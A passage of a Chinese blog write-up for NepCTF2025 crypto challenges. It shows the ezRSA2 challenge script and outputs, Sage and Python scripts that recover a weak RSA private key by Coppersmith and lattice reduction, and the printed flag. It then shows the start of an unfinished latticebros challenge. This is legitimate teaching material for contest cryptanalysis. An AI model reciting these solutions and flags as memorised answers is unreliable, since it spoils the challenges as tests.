class="number">0.33</span></span>):</span><br><span class="line">    p = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">    N = p*q</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        d = getRandomNBitInteger(<span class="built_in">int</span>(<span class="number">2048</span>*beta))</span><br><span class="line">        <span class="keyword">if</span> GCD(d, phi) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    e = inverse(d, phi)</span><br><span class="line">    </span><br><span class="line">    hints = []</span><br><span class="line">    M = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(sieve_base)):</span><br><span class="line">        li = sieve_base[i]</span><br><span class="line">        hints.append(d%li)</span><br><span class="line">        M *= li</span><br><span class="line">        <span class="keyword">if</span> M.bit_length() &gt;= <span class="number">1024</span>*gamma:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> e, N, hints</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    e,N,hints = gen_parameters()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;e=<span class="subst">&#123;<span class="built_in">hex</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;N=<span class="subst">&#123;<span class="built_in">hex</span>(N)&#125;</span>\n&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;hints=<span class="subst">&#123;hints&#125;</span>\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    flag_prefix = <span class="string">b&#x27;NepCTF&#123;&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> flag.startswith(flag_prefix)</span><br><span class="line">    <span class="keyword">assert</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    pt = bytes_to_long(flag[<span class="built_in">len</span>(flag_prefix):-<span class="number">1</span>])</span><br><span class="line">    ct = <span class="built_in">pow</span>(pt, e, N)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;ct=<span class="subst">&#123;<span class="built_in">hex</span>(ct)&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e=0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line"><span class="string">N=0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">hints=[1, 3, 0, 3, 9, 16, 10, 14, 5, 11, 21, 18, 30, 30, 38, 2, 20, 62, 66, 1, 22, 56, 41, 13, 78, 59, 51, 6, 57, 117, 73, 75, 96, 112, 50, 93, 158, 97, 146, 8, 65, 96, 186, 161, 90, 131, 46, 32, 140, 133, 50, 43, 151, 234]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ct=0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>这里一下子就可以看到<code>e</code>很大并且接近<code>N</code>，但发现$d\approx N^{0.33}$，大于<strong>boneh durfee</strong> <code>0.292</code>的<strong>上界</strong>，不适用</p><p>然，本题的<code>hints.append(d%li)</code>可以通过<strong>中国剩余定理CRT</strong>求解出<code>d</code>的<strong>低位</strong></p><p>$d_{low}\equiv d\ mod\ M$<br>$d=k_{1}M+d_{low}$</p><p>正常做这种<code>d</code>相关的题目的思路都可以借助下面这条公式，进行展开，尝试<code>copper</code>或者<strong>构造格</strong></p><p>$ed\equiv 1\ mod\ \phi(n)$</p><p>$ed=k*(N-p-q+1)+1$</p><p>因为周末也要<strong>值班</strong>。。。还是<strong>夜班</strong>，加上又不是很想碰<code>CTF</code>，所以当时就想着能不能找到<code>boneh durfee</code>的优化算法，把上界调高，偷个懒，直接梭()<br>很可惜没找到(但赛后群友有说找到的，orz)，然后困了，不想做，等赛后再看看</p><p>到上面这一步，有两种思路</p><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><p>$e<em>d_{low}+e</em>k_{1}M-1=k_{2}*(N-p-q+1)$</p><p>这里是<code>k1,k2</code>未知(<code>p q</code>暂时不管)，很明显我们可以尝试一下<strong>二元copper</strong>，不过形式得稍微变换一下</p><p>$e<em>d_{low}-1-k</em>(N-p-q+1)\equiv 0\ mod\ (e*M)$</p><p>$令X = k,Y=p+q$</p><p><code>k</code>可以借助题目脚本多跑几下，大概位数在<strong>676位</strong>，<code>p+q</code>很明显<strong>1024位</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line">N = <span class="number">0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line">hints = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">2</span>, <span class="number">20</span>, <span class="number">62</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">22</span>, <span class="number">56</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">78</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">73</span>, <span class="number">75</span>, <span class="number">96</span>, <span class="number">112</span>, <span class="number">50</span>, <span class="number">93</span>, <span class="number">158</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">8</span>, <span class="number">65</span>, <span class="number">96</span>, <span class="number">186</span>, <span class="number">161</span>, <span class="number">90</span>, <span class="number">131</span>, <span class="number">46</span>, <span class="number">32</span>, <span class="number">140</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">43</span>, <span class="number">151</span>, <span class="number">234</span>]</span><br><span class="line">ct = <span class="number">0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line">primes = <span class="built_in">list</span>(sieve_base[<span class="number">1</span>:<span class="built_in">len</span>(hints)+<span class="number">1</span>])</span><br><span class="line">M = prod(primes)</span><br><span class="line">d_low = crt(hints,primes)</span><br><span class="line">PR.&lt;x,y&gt; = PolynomialRing(Zmod(e*M))</span><br><span class="line">f = e*d_low -<span class="number">1</span> - x*(N - y + <span class="number">1</span>)</span><br><span class="line">res = small_roots(f, (<span class="number">2</span>^<span class="number">676</span>,<span class="number">2</span>^<span class="number">1024</span>),m=<span class="number">1</span>,d=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> res:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;p_q = <span class="subst">&#123;root[<span class="number">1</span>]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里<code>Sage</code>不知道发什么癫，解方程有问题，换<code>Python</code>解一下吧，<code>Python</code>还得注意一下大整数才能运行起来<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line">N = <span class="number">0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line">ct = <span class="number">0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pq = <span class="number">307418535695879466735463624869957924354358665052136409248678026715718383427120772212039629998693207855281708171850879171131527744317839878812415135610115774273232848128353184128891514282686549164628675031032302196224590402569695631086177519084924289711604045185861705566454491785664136393955640722211793934882</span></span><br><span class="line"></span><br><span class="line">p, q = symbols(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">res = solve([p*q-N, pq - (p+q)], [p, q])</span><br><span class="line">p, q = res[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(p*q == N)</span><br><span class="line">e = Integer(e)</span><br><span class="line">p = Integer(p)</span><br><span class="line">d = inverse(e, p-<span class="number">1</span>)</span><br><span class="line">ct = Integer(ct)</span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(ct, d, p)).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;NepCTF&#123;&#x27;</span>+flag+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment"># NepCTF&#123;larg3r_M0du1u5_1nf0_g1ves_b3773r_b0und5&#125;</span></span><br></pre></td></tr></table></figure></p><p>这就是一个简单的<strong>二元copper</strong>的应用</p><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><p>这里也可以尝试<strong>构造格</strong></p><p>我们把需要求解的<code>p+q</code>放到等式右边<br>$e<em>d_{low}-1+e</em>k_{1}<em>M-k_{2}</em>(N+1)=k_{2}*(p+q)$<br>可以得到</p><script type="math/tex; mode=display">\left [ \begin{matrix}1&k_1&-k_{2}\\\end{matrix} \right ]*\left [ \begin{matrix}1&0&ed_{low}-1\\0&1&eM\\0&0&N+1\\\end{matrix} \right ]\ =\left [ \begin{matrix}1&k_1&k_{2}(p+q)\\\end{matrix} \right ]</script><p><strong>配平</strong>一下目标向量，<code>k1</code>大概在<strong>333位</strong>这样，<code>k2</code>在<strong>675位</strong>这样，<code>k2(p+q)</code>大概会在<strong>1700位</strong>，所以有</p><script type="math/tex; mode=display">\left [ \begin{matrix}1&k_1&-k_{2}\\\end{matrix} \right ]*\left [ \begin{matrix}2^{1700}&0&ed_{low}-1\\0&2^{1370}&eM\\0&0&N+1\\\end{matrix} \right ]\ =\left [ \begin{matrix}2^{1700}&k_1*2^{1370}&k_{2}(p+q)\\\end{matrix} \right ]</script><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line">N = <span class="number">0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line">hints = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">2</span>, <span class="number">20</span>, <span class="number">62</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">22</span>, <span class="number">56</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">78</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">73</span>, <span class="number">75</span>, <span class="number">96</span>, <span class="number">112</span>, <span class="number">50</span>, <span class="number">93</span>, <span class="number">158</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">8</span>, <span class="number">65</span>, <span class="number">96</span>, <span class="number">186</span>, <span class="number">161</span>, <span class="number">90</span>, <span class="number">131</span>, <span class="number">46</span>, <span class="number">32</span>, <span class="number">140</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">43</span>, <span class="number">151</span>, <span class="number">234</span>]</span><br><span class="line">ct = <span class="number">0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line">primes = <span class="built_in">list</span>(sieve_base[<span class="number">1</span>:<span class="built_in">len</span>(hints)+<span class="number">1</span>])</span><br><span class="line">M = prod(primes)</span><br><span class="line">d_low = crt(hints,primes)</span><br><span class="line"></span><br><span class="line">mat = [[<span class="number">2</span>^<span class="number">1700</span>, <span class="number">0</span>, e*d_low-<span class="number">1</span>], [<span class="number">0</span>, <span class="number">2</span>^<span class="number">1370</span>, e*M], [<span class="number">0</span>, <span class="number">0</span>, N + <span class="number">1</span>]]</span><br><span class="line">L = Matrix(ZZ, mat)</span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> L.LLL():</span><br><span class="line">    k, K1, _ = res</span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">2</span>^<span class="number">1700</span>:</span><br><span class="line">        d = (K1//<span class="number">2</span>^<span class="number">1370</span>)*M + d_low</span><br><span class="line">        flag = long_to_bytes(<span class="built_in">pow</span>(ct,d,N)).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;NepCTF&#123;&#x27;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这样看的话，貌似格更方便一些……</p><h2 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a>思路三</h2><p><a href="https://eprint.iacr.org/2018/516.pdf">boneh durfee通过LSBs拔高上界 P30 Section 5</a><br>具体怎么实现不了了之，但感觉是<strong>二元copper</strong>的优化，或者说<strong>二元copper</strong>的<strong>small_roots</strong>是从<strong>boneh durfee算法</strong>中来的？<br>不清楚，反正我套的()</p><h2 id="reference-1"><a href="#reference-1" class="headerlink" title="reference"></a>reference</h2><ul><li><a href="https://faritree.top/2025/07/28/NepCTF2025-Crypto-WP">Crypto全解</a></li><li><a href="https://su1yu4n.github.io/2025/08/01/NepCTF2025-ezRSA2%E5%AE%98%E6%96%B9%E9%A2%98%E8%A7%A3">出题人题解</a></li></ul><h1 id="NepCTF2025-latticebros-待补ing"><a href="#NepCTF2025-latticebros-待补ing" class="headerlink" title="NepCTF2025 - latticebros(待补ing)"></a>NepCTF2025 - latticebros(待补ing)</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#已知α的极小多项式为三次多项式f(x),即f(α)=0,且α≈54236.606188881754809671280151541781895183337725393</span></span><br><span class="line"><span class="comment">#上述极小多项式的常数项为a0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> a0,alpha</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt,log2</span><br><span class="line"></span><br><span class="line">d=<span class="number">981020902672546902438782010902608140583199504862558032616415</span></span><br><span class="line">p = d - a0</span><br><span class="line"></span><br><span class="line">k=sqrt(log2(p))+log2(log2(p))</span><br><span class="line">B = <span class="number">2</span>**<span class="number">30</span></span><br><span class="line"><span class="keyword">assert</span> B &lt; p/<span class="number">2</span>**k</span><br><span class="line"></span><br><span class="line">m = <span class="number">30</span></span><br><span class="line"><span class="keyword">assert</span> m &gt; <span class="number">2</span>*sqrt(log2(p))</span><br><span class="line"></span><br><span class="line">samples = []</span><br><span class="line">betas = []</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;samples.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    t = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">    beta = random.randint(-B + <span class="number">1</span>, B - <span class="number">1</span>)</span><br><span class="line">    a = (t * alpha - beta) % p</span><br><span class="line">    samples.append((t, a))</span><br><span class="line">    betas.append(beta)</span><br><span class="line"></span><br><span class="line">f.write(<span class="built_in">str</span>(samples))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">assert</span> (betas[i]-samples[i][<span class="number">0</span>]*alpha+samples[i][<span class="number">1</span>])%p == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag = long_to_bytes(alpha)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[(541847931463604073209188621415697353813245102261880389530448, 293760933113243563398917466885108625646262447370201484418246), (235213326900086489464935804156966465366154623411555613791270, 660823982268225103178763707015491421784294988488272636270997), (826464884761457937459245903152143755707241416981488127320435, 428521663319038461250005113612781686761766888058391496085911), (589542000504317435156560078533519448295689695687499354390208, 155284353896000150766154807679279597476176668344402166959399), (968823371588600973965757332601758200815345862153455338808286, 870008943690791009196027169525956126827736285614393106689402), (621636099728440147413990266662022925118216803638588918660041, 265635912066749696542909843111997941904342442664219734956888), (426696569424050102229606043215592727790577655338668728275370, 279313121876980354011480010042682666651614765507190502627689), (89450479064580125731654556963306718472532905610952012502649, 465933125964565419295325650759566635253450915499965633327941), (480355476500393865742379469913983270769356894135485925662119, 894041172171871806404285309781862268351135623868845025443422), (842436524669577199024236805258573090764419350786291073287889, 345478552143958037534551648319293899442551000874041707820740), (650054674429185550652935714084022116516082323269321462104664, 441999979283903658157822753439653947343822546158589507765994), (46289431385578693366971976442426853079852982529357847290686, 625618376463384339878849844467050454204685252824782609369180), (71444185449163133531919043374545893927347050624346741281881, 955925578289311966288639224625142299309823207245807788495453), (192579726169321656812883068526498248523814846320328766176253, 626481822474054336470183912297952839011392733501646931370367), (736527635648804640774976580747540045854351230084566721853611, 276626211757586963928788091386096607703513204646314683038338), (177922521867185878959621840269164617147915792720210315529733, 541058782621716573816245900423919799500476442285991532228641), (40610451174818168154306630612571678739921107216052349044576, 727642592899858828601137105077611015328512898368636299587376), (385012983728389322601149562441674995471397288632464238356283, 353921151307105661267278594470212933060655245893209524497156), (750447975601038834764379841158092390933760641866111445401426, 391626416964965737035878375834907580903143512300198923948189), (115058604943298010958881205548782439407592353731185670266593, 491630592857258949793489206081490523001249620510479961058022), (327389234395954477946639629629085910688793716425320663599360, 24975272330009592102362429346350824580378490147041708568130), (115595274689129534885608766476695918464309130165432995990883, 757961876891952019297626599379744405302595090402128271144165), (950804723308776351161744501221236453742418549093165078282534, 20307246759635231945223392614290397512873344480184942904518), (724537610412063699714461780160573528810830178440136810747811, 149681928388378582933943374524511804362928290938917573644613), (340891278018589324130004945217960336392205386747747011263373, 683307718413135477104477081812052183267507312278283317237187), (104379682905784169840335131193505192063050242530811180817410, 715010230598797717533306270232399781090458356371977748416491), (644160326926600986730919713173510327120201404569141824224075, 127877985489410167008195578625004740882394608402141169695352), (549253388716005399852261816416312267100135940382820676807345, 210560134643237517255193955173709174155305784935427470113433), (968265711632086435506163736279856957220961064226797549228006, 273174723915971720522674140326199419265943707917542063022561), (704367622558261900937184683100177434487519780290678439135652, 959106497548134540301589019840013331842784496835379005298630)]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure><h1 